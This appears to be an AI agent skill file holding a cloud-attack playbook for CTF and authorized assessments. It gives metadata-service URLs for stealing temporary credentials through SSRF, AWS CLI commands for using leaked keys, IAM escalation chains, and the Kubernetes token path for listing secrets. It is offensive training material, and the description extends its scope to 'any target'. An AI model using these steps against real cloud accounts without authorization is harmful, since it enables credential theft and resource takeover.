name: cloud-attack
description: Cloud attack playbook — recognize the cloud (AWS/Azure/GCP/阿里云/腾讯云), hit the metadata service for IAM/CAM credentials (IMDSv1/v2), then use leaked AK/SK credentials to enumerate permissions, take over resources (S3/COS/EC2/CVM), and escalate via IAM. Use on cloud/SSRF challenges and any target exposing cloud creds or metadata.
---

# Cloud Attack (metadata → creds → resource takeover)

Authorized CTF/assessment use. Cloud challenges chain two moves: (1) reach the metadata service → grab temporary credentials; (2) use those credentials to enumerate and take over cloud resources where the flag lives.

## 1. Identify the cloud

| Tell | Cloud |
|---|---|
| `x-amz-*` header, `Server: AmazonS3` | AWS |
| `x-ms-*` header, `.azurewebsites.net` | Azure |
| `.googleapis.com`, `x-goog-*` | GCP |
| `.aliyuncs.com`, `x-oss-*` | 阿里云 |
| `.myqcloud.com`, `x-cos-*`, `Server: tencent-cos` | 腾讯云 |

## 2. Metadata service (the credential bridge)

```
AWS    http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
       IMDSv2: PUT /latest/api/token (X-aws-ec2-metadata-token-ttl-seconds: 21600) → then GET with X-aws-ec2-metadata-token
Azure  http://169.254.169.254/metadata/instance?api-version=2021-02-01  (Metadata: true)
       .../identity/oauth2/token?resource=https://management.azure.com/
GCP    http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token  (Metadata-Flavor: Google)
阿里云 http://100.100.100.200/latest/meta-data/ram/security-credentials/<role>
腾讯云 http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/<role>
```
The returned JSON has `AccessKeyId`+`SecretAccessKey` (+`Token`). Reached via SSRF or any shell on the instance.

## 3. Use the leaked AK/SK

Recognize the key format first: `AKIA` (AWS long-term), `ASIA` (AWS temp + token), `AKIDz` (腾讯云), `LTAI` (阿里云).

**AWS:**
```bash
export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
aws sts get-caller-identity                      # who am I
aws s3 ls / aws s3 ls s3://bucket                # list buckets (flag files!)
aws ec2 describe-instances / describe-snapshots
aws iam list-attached-user-policies               # what can I do
```
**腾讯云 / 阿里云:** use `tccli` / `aliyun` CLI with the same credential env vars; enumerate COS/OSS buckets, CVM/ECS instances.

## 4. Escalate & find the flag

- **S3/COS bucket listing** → the flag is often a file in a world-readable bucket (`aws s3 ls s3://<bucket> --recursive`).
- **IAM privilege escalation:** if the role can `iam:PassRole`/`lambda:Invoke`/`ec2:RunInstances`, chain to a higher-privilege resource.
- **Metadata → STS token → cloud API** is the whole chain; don't stop at the credential — enumerate resources.
- **K8s:** `/var/run/secrets/kubernetes.io/serviceaccount/token` → the SA token reaches the API server → list secrets.

## Cross-cutting
- **Metadata is one HTTP request away from creds** — if SSRF reaches `169.254.169.254`, that's the cloud solve.
- **Identify the cloud before running commands** — the CLI and metadata paths differ per provider.
- Self-verify with a `get-caller-identity`/`whoami` equivalent before enumerating resources.
